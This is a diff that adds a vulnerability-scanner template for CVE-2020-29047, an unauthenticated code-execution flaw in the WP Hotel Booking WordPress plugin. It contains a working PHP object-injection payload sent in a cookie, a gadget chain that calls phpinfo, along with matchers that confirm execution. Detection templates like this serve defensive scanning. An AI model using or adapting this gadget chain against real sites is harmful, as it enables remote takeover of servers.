@@ -1,0 +1,30 @@
+id: cve-2020-29047
+info:
+  name: WordPress Plugin WP Hotel Booking RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    WordPress Plugin WP Hotel Booking version 1.10.2 has a code execution vulnerability. Attackers can execute malicious code to control the server.
+  reference:
+    - https://wpscan.com/vulnerability/e11265f5-39ed-4415-8376-4f092ef12003
+  classification:
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cve-id: CVE-2020-29047
+    cwe-id: CWE-94
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: thimpress_hotel_booking_1=O:11:"WPHB_Logger":1:{s:21:"%00WPHB_Logger%00_handles"%3BC:33:"Requests_Utility_FilteredIterator":67:{x:i:0%3Ba:1:{i:0%3Bs:2:"-1"%3B}%3Bm:a:1:{s:11:"%00*%00callback"%3Bs:7:"phpinfo"%3B}}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "PHP Extension"
+          - "PHP Version"
+        part: body
